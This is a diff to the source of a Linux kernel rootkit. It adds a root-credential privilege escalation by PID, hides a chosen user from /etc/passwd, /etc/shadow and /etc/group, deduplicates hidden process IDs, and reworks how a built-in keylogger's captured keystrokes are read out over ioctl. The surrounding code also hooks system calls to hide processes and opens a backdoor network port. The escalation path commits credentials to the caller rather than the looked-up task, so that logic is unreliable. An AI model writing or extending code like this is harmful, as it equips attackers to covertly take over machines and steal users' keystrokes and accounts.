@@ -48,6 +48,7 @@ struct ftrace_hook
 };
 
 static DEFINE_MUTEX(rk_mutex);
+static DEFINE_MUTEX(keylog_read_lock);  /* serialises GET_KEYLOG ioctl */
 typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
 
 static orig_getdents64_t orig_getdents64;
@@ -77,10 +78,10 @@ static bool module_hidden = false;
 
 /* === Keylogger === */
 static char keylog_buf[KEYLOG_BUF_MAX];
+static char keylog_tmp[KEYLOG_BUF_MAX]; /* scratch buffer for ioctl read */
 static int keylog_pos = 0;
 static bool keylog_enabled = false;
 static DEFINE_SPINLOCK(keylog_lock);
-
 
 /* === Rootkit active state (toggled via magic signal) === */
 static bool rk_active = true;
@@ -248,9 +249,15 @@ static bool is_pid_hidden(pid_t pid)
 static int add_hidden_pid(pid_t pid)
 {
     unsigned long flags;
-    int ret = 0;
+    int i, ret = 0;
 
     spin_lock_irqsave(&pid_lock, flags);
+    for (i = 0; i < hidden_pid_count; i++) {
+        if (hidden_pids[i] == pid) {
+            spin_unlock_irqrestore(&pid_lock, flags);
+            return 0; /* already hidden */
+        }
+    }
     if (hidden_pid_count >= MAX_HIDDEN_PIDS) {
         ret = -ENOSPC;
     } else {
@@ -444,9 +451,9 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
             uret -= reclen;
             continue;
         }
-        if (path != NULL && strcmp(path, "/proc") == 0 && hidden_pid_count > 0) {
+        if (path != NULL && strcmp(path, "/proc") == 0 && READ_ONCE(hidden_pid_count) > 0) {
             unsigned long pid = simple_strtoul(cur->d_name, &endptr, 10);
-            if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
+            if (endptr != cur->d_name && *endptr == '\0' && is_pid_hidden((pid_t)pid)) {
                 memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
                 uret -= reclen;
                 continue;
@@ -847,34 +854,79 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         kfree(kbuf);
     }
 
-    /* Feature: Hide user from /etc/passwd and /etc/shadow */
+    /* Feature: Hide user from /etc/passwd, /etc/shadow and /etc/group */
     if (strlen(hidden_user) > 0 &&
         (strcmp(path_fd, "/etc/passwd") == 0 ||
-         strcmp(path_fd, "/etc/shadow") == 0)) {
+         strcmp(path_fd, "/etc/shadow") == 0 ||
+         strcmp(path_fd, "/etc/group") == 0)) {
+        bool is_group = (strcmp(path_fd, "/etc/group") == 0);
         char *kbuf = kzalloc(ret + 1, GFP_KERNEL);
         if (kbuf) {
             if (!copy_from_user(kbuf, (void __user *)regs->si, ret)) {
                 kbuf[ret] = '\0';
                 char *line = kbuf;
                 char *dst = kbuf;
+                size_t ulen = strlen(hidden_user);
                 while (*line) {
                     char *eol = strchr(line, '\n');
                     size_t line_len = eol ? (size_t)(eol - line + 1) : strlen(line);
+                    size_t advance = line_len;
                     bool hide = false;
 
-                    /* /etc/passwd and /etc/shadow lines start with username: */
-                    size_t ulen = strlen(hidden_user);
-                    if (line_len > ulen && memcmp(line, hidden_user, ulen) == 0
-                        && line[ulen] == ':') {
+                    /* Lines starting with username: (passwd, shadow, group) */
+                    if (line_len > ulen &&
+                        memcmp(line, hidden_user, ulen) == 0 &&
+                        line[ulen] == ':') {
                         hide = true;
                     }
 
                     if (!hide) {
                         if (dst != line)
                             memmove(dst, line, line_len);
+
+                        /* /etc/group: also strip user from member lists
+                         * format: groupname:x:GID:member1,member2,...\n */
+                        if (is_group) {
+                            char *cur = dst;
+                            char *cur_end = dst + line_len;
+                            int colons = 0;
+                            while (cur < cur_end && colons < 3) {
+                                if (*cur++ == ':')
+                                    colons++;
+                            }
+                            if (colons == 3) {
+                                bool has_nl = (dst[line_len - 1] == '\n');
+                                char *mend = has_nl ? (cur_end - 1) : cur_end;
+                                char *p = cur;
+                                while (p < mend) {
+                                    char *comma = memchr(p, ',', mend - p);
+                                    size_t elen = comma ? (size_t)(comma - p)
+                                                        : (size_t)(mend - p);
+                                    if (elen == ulen &&
+                                        memcmp(p, hidden_user, ulen) == 0) {
+                                        char *rm_s, *rm_e;
+                                        if (comma) {
+                                            rm_s = p;
+                                            rm_e = comma + 1;
+                                        } else if (p > cur && p[-1] == ',') {
+                                            rm_s = p - 1;
+                                            rm_e = mend;
+                                        } else {
+                                            rm_s = p;
+                                            rm_e = mend;
+                                        }
+                                        size_t tail = cur_end - rm_e;
+                                        memmove(rm_s, rm_e, tail);
+                                        line_len -= (rm_e - rm_s);
+                                        break;
+                                    }
+                                    p += elen + (comma ? 1 : 0);
+                                }
+                            }
+                        }
                         dst += line_len;
                     }
-                    line += line_len;
+                    line += advance;
                 }
                 *dst = '\0';
                 ret = dst - kbuf;
@@ -937,7 +989,6 @@ static int new_tcp4_seq_show(struct seq_file *seq, void *v)
     return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
 }
 #endif /* CONFIG_NET */
-
 
 /**
  * The `hook_callback` function is a static function that modifies the instruction pointer in the
@@ -1430,11 +1481,7 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0)
-    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
-#else
     ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
-#endif
     if (ret < 0)
         goto out;
 
@@ -1513,7 +1560,26 @@ static int escalation_thread_fn(void *data)
  */
 static int handle_escalation(struct rk_args *args)
 {
-    if (args->value ==  RK_PRIVESC_BY_CMD) {
+    if (args->value == RK_PRIVESC_BY_PID) {
+        struct cred * new_cred = prepare_kernel_cred(NULL);
+        if (!new_cred) {
+            printk(KERN_ERR "rootkit: prepare_kernel_cred failed\n");
+            return -ENOMEM;
+        }
+
+        struct pid *pid_struct = find_get_pid(args->target);
+        struct task_struct *task = get_pid_task(pid_struct, PIDTYPE_PID);
+        put_pid(pid_struct);
+
+        if (!task) {
+            put_cred(new_cred);
+            printk(KERN_ERR "rootkit: PID %lu not found\n", args->target);
+            return -ESRCH;
+        }
+        commit_creds(new_cred);
+        printk(KERN_INFO "rootkit: escalade de privilèges réussie pour PID=%lu\n", args->target);
+
+    } else if (args->value == RK_PRIVESC_BY_CMD) {
         char __user *cmd_user = (char __user *)args->target;
         char *cmd_kernel;
         struct task_struct *task;
@@ -1633,22 +1699,35 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
     case RK_CMD_GET_KEYLOG: {
         unsigned long flags;
-        spin_lock_irqsave(&keylog_lock, flags);
+        size_t to_copy;
+        int ret_kl = 0;
 
-        if (keylog_pos > 0) {
-            size_t to_copy = keylog_pos;
-            if (to_copy > RK_MSG_MAX - 1)
-                to_copy = RK_MSG_MAX - 1;
-            if (copy_to_user((char __user *)args.target,
-                             keylog_buf, to_copy)) {
-                spin_unlock_irqrestore(&keylog_lock, flags);
-                return -EFAULT;
-            }
-            /* flush buffer after read */
+        mutex_lock(&keylog_read_lock);
+
+        /* snapshot buffer under spinlock, then release before copy_to_user */
+        spin_lock_irqsave(&keylog_lock, flags);
+        to_copy = keylog_pos;
+        if (to_copy > KEYLOG_BUF_MAX - 2)
+            to_copy = KEYLOG_BUF_MAX - 2;
+        if (to_copy > 0) {
+            memcpy(keylog_tmp, keylog_buf, to_copy);
+            keylog_tmp[to_copy] = '\0';
             keylog_pos = 0;
             keylog_buf[0] = '\0';
         }
         spin_unlock_irqrestore(&keylog_lock, flags);
+
+        if (to_copy > 0) {
+            if (copy_to_user((char __user *)args.target,
+                             keylog_tmp, to_copy + 1))
+                ret_kl = -EFAULT;
+        }
+
+        mutex_unlock(&keylog_read_lock);
+        if (ret_kl) {
+            mutex_unlock(&rk_mutex);
+            return ret_kl;
+        }
         break;
     }
 
